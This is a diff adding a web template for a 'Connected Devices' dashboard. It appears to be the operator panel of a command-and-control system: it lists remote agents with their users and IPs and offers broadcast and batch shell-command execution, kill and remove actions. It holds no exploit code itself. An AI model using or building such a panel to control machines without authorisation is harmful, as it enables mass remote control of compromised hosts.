@@ -1,0 +1,193 @@
+{% extends "base.html" %}
+{% block title %}Devices{% endblock %}
+{% block page_title %}Connected Devices{% endblock %}
+{% block topbar_actions %}
+<button class="btn sm" onclick="broadcastModal()">Broadcast</button>
+<button class="btn sm primary" onclick="showBatchBar()">Batch Mode</button>
+<a href="/api/export/agents" class="btn sm" style="font-size:11px">Export CSV</a>
+{% endblock %}
+
+{% block content %}
+<div class="card" style="padding:14px 20px;margin-bottom:16px;display:flex;gap:10px;align-items:center">
+  <input type="text" id="filterInput" placeholder="Filter by hostname, IP, OS, group..." style="flex:1" oninput="filterTable()">
+  <select id="filterStatus" onchange="filterTable()" style="width:130px">
+    <option value="">All status</option>
+    <option value="alive">Online</option>
+    <option value="dead">Offline</option>
+  </select>
+  <select id="filterPlatform" onchange="filterTable()" style="width:150px">
+    <option value="">All platforms</option>
+    <option value="machine">Machine</option>
+    <option value="vm">VM</option>
+    <option value="container">Container</option>
+    <option value="colab">Google Colab</option>
+    <option value="cloud">Cloud Instance</option>
+    <option value="mobile">Mobile</option>
+    <option value="iot">IoT</option>
+  </select>
+</div>
+
+<div id="batchBar" style="display:none;margin-bottom:14px" class="card" >
+  <div style="display:flex;gap:8px;align-items:center;flex-wrap:wrap">
+    <span style="font-size:12px;color:var(--accent);font-weight:600" id="batchCount">0 selected</span>
+    <button class="btn sm" onclick="batchSelectAll()">Select All</button>
+    <button class="btn sm" onclick="batchDeselectAll()">Deselect All</button>
+    <span style="width:1px;height:20px;background:var(--border)"></span>
+    <input type="text" id="batchCmd" placeholder="Command to execute..." style="width:220px;padding:6px 10px;font-size:12px;font-family:var(--font-mono)">
+    <button class="btn sm primary" onclick="batchExec()">Execute</button>
+    <select id="batchGroup" style="width:110px;padding:5px 10px;font-size:12px">
+      <option value="default">default</option><option value="servers">servers</option>
+      <option value="workstations">workstations</option><option value="cloud">cloud</option>
+      <option value="colab">colab</option>
+    </select>
+    <button class="btn sm" onclick="batchSetGroup()">Set Group</button>
+    <button class="btn sm danger" onclick="batchKill()">Kill Selected</button>
+    <button class="btn sm danger" onclick="batchRemove()">Remove Selected</button>
+  </div>
+</div>
+
+<div class="card" style="padding:0;overflow:auto">
+  <table id="devicesTable">
+    <thead>
+      <tr>
+        <th style="width:30px"><input type="checkbox" id="selectAllCb" onchange="toggleSelectAll(this)" style="display:none"></th>
+        <th style="width:30px"></th><th>Hostname</th><th>User</th><th>OS</th><th>Ext IP</th><th>Int IP</th>
+        <th>Platform</th><th>Group</th><th>Last Seen</th><th>Actions</th>
+      </tr>
+    </thead>
+    <tbody>
+    {% for a in agents %}
+    <tr data-id="{{ a.id }}" data-alive="{{ 'alive' if a.is_alive else 'dead' }}" data-platform="{{ a.platform_type }}" data-search="{{ a.hostname }} {{ a.username }} {{ a.os }} {{ a.ip_external }} {{ a.ip_internal }} {{ a.group_name }}">
+      <td><input type="checkbox" class="agent-cb" value="{{ a.id }}" onchange="updateBatchCount()" style="display:none"></td>
+      <td>{% if a.is_alive %}<span class="dot-alive pulse"></span>{% else %}<span class="dot-dead"></span>{% endif %}</td>
+      <td><a href="/console/{{ a.id }}" style="font-weight:500">{{ a.hostname or a.id[:12] }}</a></td>
+      <td style="color:var(--text-dim);font-size:12px">{{ a.username }}</td>
+      <td><span class="badge os-{{ (a.os or 'unknown').split()[0]|lower }}">{{ a.os or '?' }}</span></td>
+      <td style="font-family:var(--font-mono);font-size:12px">{{ a.ip_external }}</td>
+      <td style="font-family:var(--font-mono);font-size:12px;color:var(--text-dim)">{{ a.ip_internal }}</td>
+      <td><span class="badge type">{{ a.platform_type }}</span></td>
+      <td>
+        <select class="group-select" data-agent="{{ a.id }}" onchange="updateGroup(this)" style="padding:5px 10px;font-size:12px;width:110px">
+          <option value="default" {% if a.group_name=='default' %}selected{% endif %}>default</option>
+          <option value="servers" {% if a.group_name=='servers' %}selected{% endif %}>servers</option>
+          <option value="workstations" {% if a.group_name=='workstations' %}selected{% endif %}>workstations</option>
+          <option value="cloud" {% if a.group_name=='cloud' %}selected{% endif %}>cloud</option>
+          <option value="mobile" {% if a.group_name=='mobile' %}selected{% endif %}>mobile</option>
+          <option value="colab" {% if a.group_name=='colab' %}selected{% endif %}>colab</option>
+        </select>
+      </td>
+      <td style="color:var(--text-dim);font-size:12px;white-space:nowrap">{{ a.last_seen }}</td>
+      <td>
+        <div style="display:flex;gap:6px">
+          <a href="/console/{{ a.id }}" class="btn sm">Console</a>
+          <button class="btn sm danger" onclick="removeAgent('{{ a.id }}')">Kill</button>
+        </div>
+      </td>
+    </tr>
+    {% else %}
+    <tr><td colspan="11" style="color:var(--text-dim);text-align:center;padding:30px">No agents connected</td></tr>
+    {% endfor %}
+    </tbody>
+  </table>
+</div>
+
+<div class="modal-overlay" id="broadcastModalEl" onclick="if(event.target===this)closeBroadcast()">
+  <div class="modal">
+    <h3>Broadcast Command</h3>
+    <div class="form-group">
+      <label>Target Group</label>
+      <select id="bcTarget" style="width:100%">
+        <option value="all">All online agents</option>
+        <option value="default">default</option>
+        <option value="servers">servers</option>
+        <option value="workstations">workstations</option>
+        <option value="cloud">cloud</option>
+        <option value="mobile">mobile</option>
+        <option value="colab">colab</option>
+      </select>
+    </div>
+    <div class="form-group">
+      <label>Command</label>
+      <input type="text" id="bcCommand" placeholder="whoami && id">
+    </div>
+    <div class="modal-actions">
+      <button class="btn" onclick="closeBroadcast()">Cancel</button>
+      <button class="btn primary" onclick="sendBroadcast()">Execute on All</button>
+    </div>
+  </div>
+</div>
+{% endblock %}
+
+{% block scripts %}
+<script>
+function filterTable() {
+  const q = document.getElementById('filterInput').value.toLowerCase();
+  const st = document.getElementById('filterStatus').value;
+  const pl = document.getElementById('filterPlatform').value;
+  document.querySelectorAll('#devicesTable tbody tr').forEach(r => {
+    const s = (r.dataset.search || '').toLowerCase();
+    const match = (!q || s.includes(q)) && (!st || r.dataset.alive === st) && (!pl || r.dataset.platform === pl);
+    r.style.display = match ? '' : 'none';
+  });
+}
+function updateGroup(el) {
+  fetch(`/api/agent/${el.dataset.agent}/update`, { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({group_name: el.value}) });
+}
+function removeAgent(id) {
+  if (confirm('Remove this agent?'))
+    fetch(`/api/agent/${id}/remove`, {method:'DELETE'}).then(() => location.reload());
+}
+function broadcastModal() { document.getElementById('broadcastModalEl').classList.add('active'); }
+function closeBroadcast() { document.getElementById('broadcastModalEl').classList.remove('active'); }
+function sendBroadcast() {
+  const target = document.getElementById('bcTarget').value;
+  const cmd = document.getElementById('bcCommand').value;
+  if (!cmd) return;
+  fetch('/api/task/broadcast', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({type:'cmd', payload:cmd, target}) })
+    .then(r => r.json()).then(d => { alert(`Sent to ${d.count} agents`); closeBroadcast(); });
+}
+
+let batchMode = false;
+function showBatchBar(){
+  batchMode = !batchMode;
+  document.getElementById('batchBar').style.display = batchMode ? '' : 'none';
+  document.getElementById('selectAllCb').style.display = batchMode ? '' : 'none';
+  document.querySelectorAll('.agent-cb').forEach(cb => { cb.style.display = batchMode ? '' : 'none'; cb.checked = false; });
+  updateBatchCount();
+}
+function getSelected(){ return [...document.querySelectorAll('.agent-cb:checked')].map(cb=>cb.value); }
+function updateBatchCount(){ document.getElementById('batchCount').textContent = getSelected().length + ' selected'; }
+function toggleSelectAll(el){ document.querySelectorAll('.agent-cb').forEach(cb=>{cb.checked=el.checked;}); updateBatchCount(); }
+function batchSelectAll(){ document.querySelectorAll('.agent-cb').forEach(cb=>{cb.checked=true;}); document.getElementById('selectAllCb').checked=true; updateBatchCount(); }
+function batchDeselectAll(){ document.querySelectorAll('.agent-cb').forEach(cb=>{cb.checked=false;}); document.getElementById('selectAllCb').checked=false; updateBatchCount(); }
+
+function _batchPost(action, extra={}){
+  const ids = getSelected();
+  if(!ids.length) return alert('Select agents first');
+  return fetch('/api/agents/batch',{method:'POST',headers:{'Content-Type':'application/json'},
+    body:JSON.stringify({agent_ids:ids, action, ...extra})}).then(r=>r.json());
+}
+function batchExec(){
+  const cmd = document.getElementById('batchCmd').value.trim();
+  if(!cmd) return alert('Enter a command');
+  _batchPost('command',{payload:cmd}).then(d=>{ showNotification(`Sent to ${d.count} agents`,'green'); });
+}
+function batchSetGroup(){
+  const g = document.getElementById('batchGroup').value;
+  _batchPost('group',{group:g}).then(d=>{ showNotification(`${d.count} agents -> group ${g}`,'green'); setTimeout(()=>location.reload(),800); });
+}
+function batchKill(){
+  if(!confirm('KILL selected agents?')) return;
+  _batchPost('kill').then(d=>{ showNotification(`Kill sent to ${d.count}`,'red'); });
+}
+function batchRemove(){
+  if(!confirm('REMOVE selected agents permanently?')) return;
+  _batchPost('remove').then(d=>{ showNotification(`Removed ${d.count}`,'red'); setTimeout(()=>location.reload(),800); });
+}
+
+socket.on('agent_update', data => {
+  if(data.action === 'register') showNotification(`New agent: ${data.hostname||data.id.slice(0,8)}`, 'green');
+  if(data.action === 'offline') showNotification(`Agent offline: ${data.hostname||data.id.slice(0,8)}`, 'red');
+});
+</script>
+{% endblock %}
